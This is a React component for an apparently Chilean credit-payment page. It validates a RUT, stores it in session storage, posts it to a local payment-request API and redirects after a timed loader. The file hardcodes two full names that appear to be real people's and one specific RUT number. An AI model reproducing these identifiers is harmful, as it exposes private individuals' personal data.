import React, { useState } from "react";
import { useLocation } from "wouter";
import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { validateRut, formatRut } from "@/lib/rutValidator";
import { LoadingSpinner } from "./LoadingSpinner";
import CircleLoader from "./CircleLoader";

// Form schema with validation
const formSchema = z.object({
  rut: z.string()
    .min(1, "El RUT es obligatorio")
    .refine(validateRut, "RUT inválido. Revisa el formato y dígito verificador"),
});

type FormValues = z.infer<typeof formSchema>;

export default function RutInput() {
  const [, setLocation] = useLocation();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showCircleLoader, setShowCircleLoader] = useState(false);
  
  // Initialize form
  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      rut: "",
    },
  });

  // Handle form submission
  const onSubmit = async (data: FormValues) => {
    try {
      setIsSubmitting(true);
      console.log("Enviando solicitud con RUT:", data.rut);
      
      // Guardar el RUT en sessionStorage para usarlo en otras páginas
      sessionStorage.setItem('rutValue', data.rut);
      
      // Asignar nombre del cliente según el RUT ingresado (en un sistema real, esto vendría del backend)
      let clientName = "CRISTIAN SERVANDO VALENZUELA BUSTOS";
      if (data.rut === "18.430.589-5") {
        clientName = "MANUEL ALEJANDRO VALENZUELA SEPULVEDA";
      }
      // Guardar el nombre del cliente en sessionStorage
      sessionStorage.setItem('clientName', clientName);
      
      // Send payment request to server
      const response = await fetch("/api/payment-request", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ rut: data.rut }),
      });
      
      if (!response.ok) {
        throw new Error("Error al procesar la solicitud");
      }
      
      const result = await response.json();
      console.log("Resultado de la solicitud:", result);
      
      // Guardar el ID de la solicitud en sessionStorage
      sessionStorage.setItem('paymentRequestId', result.requestId);
      
      // Si el servidor nos devuelve un mensaje, puede ser que ya exista una solicitud activa
      if (result.message) {
        console.log(result.message);
      }
      
      // Verificar la información de la solicitud
      const verifyResponse = await fetch(`/api/payment-request/${result.requestId}`);
      if (!verifyResponse.ok) {
        throw new Error("Error al verificar la solicitud");
      }
      const verifyResult = await verifyResponse.json();
      console.log("Solicitud verificada:", verifyResult);
      
      // Si la solicitud ya tiene información prepoblada, guardarla en sessionStorage
      if (verifyResult.clientName) {
        sessionStorage.setItem('clientName', verifyResult.clientName);
      }
      
      // Mostrar el CircleLoader a pantalla completa
      setShowCircleLoader(true);
      
      // Esperar exactamente 5 segundos antes de redirigir
      setTimeout(() => {
        // Redirect to payment options page
        setLocation('/payment-options');
      }, 5000); // 5000 milisegundos = 5 segundos
    } catch (error) {
      console.error("Error al enviar la solicitud:", error);
      setIsSubmitting(false);
      setShowCircleLoader(false);
    }
  };

  // Format RUT as user types
  const handleRutChange = (e: React.ChangeEvent<HTMLInputElement>, onChange: (...event: any[]) => void) => {
    const formatted = formatRut(e.target.value);
    onChange(formatted);
  };

  return (
    <div className="w-full flex flex-col items-start justify-start">
      {/* Mostrar el círculo de carga cuando showCircleLoader es true */}
      {showCircleLoader && <CircleLoader size={80} fullScreen={true} color="#009ADE" />}
      
      <div className="mb-6 w-full">
        <h2 className="text-[#00AEEF] font-semibold text-[24px] mb-2">Pagar es rápido y fácil</h2>
        <p className="text-[16px] text-gray-600">
          Ahora el pago de tu crédito es totalmente en línea.
        </p>
      </div>
      
      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6 w-full">
          <div className="mb-6">
            <label className="block text-[16px] mb-2 text-gray-700 font-medium">Rut</label>
            <FormField
              control={form.control}
              name="rut"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <div className="relative">
                      <Input 
                        placeholder="Ingresa tu RUT" 
                        {...field} 
                        onChange={(e) => handleRutChange(e, field.onChange)}
                        className="border-gray-300 rounded text-[16px] py-2 h-12"
                        minLength={8}
                        maxLength={12}
                        disabled={isSubmitting}
                      />
                    </div>
                  </FormControl>
                  <FormMessage className="text-red-500 mt-1 mb-1 w-full" />
                </FormItem>
              )}
            />
          </div>
          
          <Button 
            type="submit" 
            className="w-full py-3 bg-[#00AEEF] hover:bg-[#0096cc] text-white font-medium text-[16px] rounded-md"
            disabled={isSubmitting}
          >
            {isSubmitting ? (
              <div className="flex items-center justify-center">
                <LoadingSpinner size="small" color="white" />
                <span className="ml-2">Procesando...</span>
              </div>
            ) : (
              "Ir a Pagar"
            )}
          </Button>
        </form>
      </Form>
    </div>
  );
}